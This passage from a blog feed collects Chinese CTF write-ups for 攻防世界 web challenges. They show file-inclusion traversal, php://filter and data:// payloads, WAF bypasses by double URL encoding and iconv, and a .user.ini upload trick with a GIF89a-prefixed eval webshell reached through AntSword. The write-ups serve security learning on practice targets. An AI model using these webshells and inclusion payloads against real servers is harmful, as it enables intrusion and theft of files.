class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们注意到还有一个hint.php页面，于是打开该页面，发现提示我们flag在ffffllllaaaagggg里。</p></li><li><p>分析代码</p></li></ol><ul><li><p>变量前的&amp;符号<br>$变量前加&amp;符号，表示引用，也即引用传递。</p></li><li><p>白名单数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br></pre></td></tr></table></figure></li><li><p>is_string()函数<br>该函数是判断内部的变量是否为字符串</p></li><li><p>mb_substr()函数<br>该函数是获取部分字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$str</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$start</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">string</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">str</span></span><br><span class="line"><span class="comment">从该 string 中提取子字符串。</span></span><br><span class="line"><span class="comment">start</span></span><br><span class="line"><span class="comment">如果 start 不是负数，返回的字符串会从 str 第 start 的位置开始，从 0 开始计数。举个例子，字符串 &#x27;abcdef&#x27;，位置 0 的字符是 &#x27;a&#x27;，位置 2 的字符是 &#x27;c&#x27;，以此类推。</span></span><br><span class="line"><span class="comment">如果 start 是负数，返回的字符串是从 str 末尾处第 start 个字符开始的。</span></span><br><span class="line"><span class="comment">length</span></span><br><span class="line"><span class="comment">str 中要使用的最大字符数。如果省略了此参数或者传入了 NULL，则会提取到字符串的尾部。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>根据字符数执行一个多字节安全的 substr() 操作。 位置是从 str 的开始位置进行计数。 第一个字符的位置是 0。第二个字符的位置是 1，以此类推。</p></li><li><p>mb_strpos()函数<br>该函数是查找字符串在另一个字符串中首次出现的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$haystack</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$needle</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">int</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">haystack</span></span><br><span class="line"><span class="comment">要被检查的 string。</span></span><br><span class="line"><span class="comment">needle</span></span><br><span class="line"><span class="comment">在 haystack 中查找这个字符串。 和 strpos() 不同的是，数字的值不会被当做字符的顺序值。</span></span><br><span class="line"><span class="comment">offset</span></span><br><span class="line"><span class="comment">搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>基于字符数执行一个多字节安全的 strpos() 操作。 第一个字符的位置是 0，第二个字符的位置是 1，以此类推。</p></li><li><p>is_array()函数<br>该函数是判断第1个变量是否在第2个数组中</p></li><li><p>empty()函数<br>该函数是检查变量是否为空。<br>当变量不存在、值为空、等于 0、为 false 时，返回 true。否则返回 false。</p></li><li><p>emmm::checkFile()<br>输出emmm函数的返回值</p></li></ul><p>PHP函数代码都解析完毕后，那么我们可以知道传入的参需要满足以下条件：<br>不为空，是字符串，<br>第1个问号(?)前的字符在白名单内</p><ol start="3"><li>构造语句<br>我们已经知道了条件，接下来就是构造语句来满足条件。可以看到有include函数，所以我们想到文件包含漏洞。<br>使用目录穿越（..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;）的方式可以访问到父目录，从而访问到ffffllllaaaagggg。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>拿到flag</li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>PHP代码看得太少了，导致一堆代码都看不懂！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;自己的缺陷在于对于php代码还不甚熟练&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-easyupload</title>
    <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-_easyupload/"/>
    <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-_easyupload/</id>
    <published>2022-12-13T16:00:00.000Z</published>
    <updated>2022-12-14T17:42:09.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>只是打了一点靶场，完全不够，知识还多着呢！</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li>尝试<br>首先进行多种尝试，修改php文件名后缀的方法几乎都试过了，无法上传成功。<br>图片木马多次尝试也无法成功。那么只能只能换一种思路。<br>几经波折后，我们发现了几个重要的点：</li></ol><ul><li>如果文件中含有php，那么无法上传成功，所以必须选择没有php的方式。这里可以使用短标签绕过。</li><li>即便上传了也无法连接蚁剑。那么我们可以选择尝试.user.ini</li></ul><p>这里涉及到几个知识：</p><ul><li><p>短标签<br>通常情况下输出我们会这样写：<br><code>&lt;?php echo &quot;hello&quot;; ?&gt;</code><br>但其实我们可以简写为: <code>&lt;?= &quot;hello&quot;;?&gt;</code></p></li><li><p>PHP REQUEST</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP 中提供了一个 $_REQUEST 全局变量，它是一个包含了 $_POST、$_GET 和 $_COOKIE 的数组，</span><br><span class="line">数组结构与 $_POST 和 $_GET 类似。</span><br><span class="line">也就是说不管是使用 POST 还是使用 GET 方式提交的数据，都可以使用 $_REQUEST 来获取，</span><br><span class="line">甚至可以使用 $_REQUEST 来获取 COOKIE 的信息。在 PHP5.3 中引入 request_order 属性，</span><br><span class="line">我们可以通过在 php.ini 配置文件中修改 request_order 属性的值，来控制 $_REQUEST 中包含的内容。</span><br></pre></td></tr></table></figure></li><li><p>.user.ini<br>.user.ini:它比.htaccess用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。<br>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。<br>auto_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：<br><code>auto_prepend_file=123.gif</code><br>其中123.gif是需要包含的文件，借此我们可以包含任意文件。<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">更详细的解释</a></p></li><li><p>GIF89a<br>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。<br>示例：<br>在记事本下写下该内容，后缀保存为图片</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span> = <span class="string">&quot;refresh&quot;</span> <span class="attr">content</span> = <span class="string">&quot;1; url=http://www.***.com/&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当单独查看此文件时，会出现GIF89a，然后跳转到指定的网页（ie6和ie7下，Firefox下不可以）<br>php下检测（使用getimagesize函数无法判断其图片是无效的）</p></li></ul><ol start="2"><li><p>构造条件<br>涉及的知识都清楚后，我们先创建一个.user.ini文件，文件内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=c.jpg</span><br></pre></td></tr></table></figure><p>创建一个c.txt文件，文件内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=system(&#x27;cat /flag&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>然后将其后缀改为jpg</p></li><li><p>抓包修改<br>首先上传.user.ini文件，抓包<br>得到的包将里面的Content-Type改为image&#x2F;jpeg,放包<br>页面应显示： <code>file upload successful, the path is: uploads/.user.ini</code><br>然后上传c.jpg<br>页面应显示： <code>file upload successful, the path is: uploads/c.jpg</code><br>上传成功后便可进行下一步。</p></li><li><p>蚁剑连接<br>接下来我们打开F12，从Network处查看我们上传的文件地址：<br><code>http://61.147.171.105:56641/uploads/index.php</code><br>找到文件地址后，打开蚁剑连接<br>url地址填写上面的文件地址，连接密码则填写cmd<br>等待几秒，测试连接，一般会显示连接成功。<br>然后添加数据，等待几秒后，右键 文件管理。（有时蚁剑会出小问题，多尝试几次即可）<br>如果没有几个文件，删除重来。如果有很多文件，那么就可以从中找到我们所需的flag</p></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>慢慢来，不要忽略细节。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_56426046/article/details/126563269">攻防世界ctf题目easyupload做题笔记</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;只是打了一点靶场，完全不够，知识还多着呢！&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="upload" scheme="http://example.com/categories/CTF/upload/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="upload" scheme="http://example.com/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-baby_web</title>
    <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/"/>
    <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/</id>
    <published>2022-12-13T16:00:00.000Z</published>
    <updated>2022-12-14T06:08:21.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也是一道非常简单的题目</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>看题<br>非常简单，就是要我们访问初始界面:index.php。<br>但问题是初始界面无法访问，总是会被重定向为:1.php。</p></li><li><p>抓包解决<br>既然在网页中不能访问初始界面，那么我们直接抓包。<br>抓包后送到Repeater，然后将1.php改为index.php，再send<br>之后即可在response中拿到flag</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;也是一道非常简单的题目&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="Web" scheme="http://example.com/categories/CTF/Web/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-file_include</title>
    <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/"/>
    <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/</id>
    <published>2022-12-13T16:00:00.000Z</published>
    <updated>2022-12-14T17:40:13.440Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉挺开心的。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./check.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显是文件包含，get型传参</p><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>首先按照标准的获取文件内容方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.base64-encode/resource=check.php</span><br></pre></td></tr></table></figure><p>执行后发现显示：do not hack!<br>这是配置了WAF，于是我们需要弄清楚哪里被过滤并且寻找绕过方式。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>我们可以尝试在各个字段中添加1来破坏完整性，通过在ba1se64-en1code我们可知是base64和encode被过滤了。<br>于是需要想办法绕过base64和encode来达到目的。</p><h3 id="第1种方法"><a href="#第1种方法" class="headerlink" title="第1种方法"></a>第1种方法</h3><p><strong>二次编码URL绕过</strong><br>我们只需将as和nc连续编码两次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字符第1次第2次</span><br><span class="line">as %61%73%2561%2573</span><br><span class="line">nc %63%6f%2563%256f</span><br></pre></td></tr></table></figure><p>用第二次编码后的字符替换掉原来的字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.b%2561%2573e64-en%2563%256fde/resource=flag.php</span><br></pre></td></tr></table></figure><p>得到flag</p><h3 id="第2种方法"><a href="#第2种方法" class="headerlink" title="第2种方法"></a>第2种方法</h3><p><strong>convert.iconv.* 绕过</strong><br>这个过滤器需要php支持iconv，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。<br>iconv — 字符串按要求的字符编码来转换<br>convert.iconv.*的使用有两种方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line">or </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure><p>列举部分编码方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*UCS-4BE UCS-4LE*  UCS-2  UCS-2BE  </span><br><span class="line">UCS-2LE  UTF-32*  UTF-32BE*  UTF-32LE*  </span><br><span class="line">UTF-16*  UTF-16BE*  UTF-16LE*  UTF-7  </span><br><span class="line">UTF7-IMAP  UTF-8*  ASCII*  EUC-JP*  SJIS*</span><br><span class="line">eucJP-win*  SJIS-win*  ISO-2022-JP</span><br><span class="line">ISO-2022-JP-MS  CP932  CP51932  BASE64</span><br></pre></td></tr></table></figure><p>更多可参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a><br>经过多次尝试，最终找到了其中一种编码绕过方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>没有直接看答案做出的题还是让人蛮高兴的。又学习到了一点。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Zero_Adam/article/details/116170568">base64 的编码小trick</a><br><a href="https://blog.csdn.net/yuanxu8877/article/details/127607264">攻防世界web-file_include</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;感觉挺开心的。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-fileclude</title>
    <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileclude/"/>
    <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileclude/</id>
    <published>2022-12-13T16:00:00.000Z</published>
    <updated>2022-12-14T12:06:55.106Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含的第一道ctf，之前也没练过，所以不知道怎么做。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>分析代码<br>打开后显示这样一段php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>];</span><br><span class="line">    <span class="variable">$file2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$file1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$file2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file2</span>) === <span class="string">&quot;hello ctf&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$file1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO&quot;</span>);</span><br></pre></td></tr></table></figure><p>看到php代码中的flag.php，我们直接在url后面加上，但是没有成功。<br>于是开始分析代码，可以看到要求以get方式传2个参数file1和file2。<br>file1的要求是非空，且被放入了include函数中。<br>file2放入了file_get_contents函数中，要求是全等于hello ctf<br>那么可以使用伪协议来读取flag.php源代码。</p></li><li><p>伪协议与解码<br>可使用的伪协议有很多种，这里仅演示我使用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file1=php://filter/convert.base64-encode/resource=flag.php&amp;file2=data://text/plain,hello ctf</span><br></pre></td></tr></table></figure><p>得到一串base64编码的数据，只需解码即可得到flag</p></li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>第一次做文件包含的题，仅仅是开始！</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_59057526/article/details/126747831">攻防世界-fileclude</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;文件包含的第一道ctf，之前也没练过，所以不知道怎么做。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界_PHP2</title>
    <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_PHP2/"/>
    <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_PHP2/</id>
    <published>2022-12-13T16:00:00.000Z</published>
    <updated>2022-12-14T05:41:13.877Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一道很简单的题，但我因为基础不牢，导致做不出来。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>查看源码<br>首先页面显示没有意义的一句话。<br>然后我们点鼠标右键尝试查看源代码，无法看到。<br>于是尝试其它方式，比如在url后面加index.phps：<br><code>url/index.phps</code><br>源代码成功显示（用工具扫一下会比较好）</p></li><li><p>分析条件<br>我们看到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span 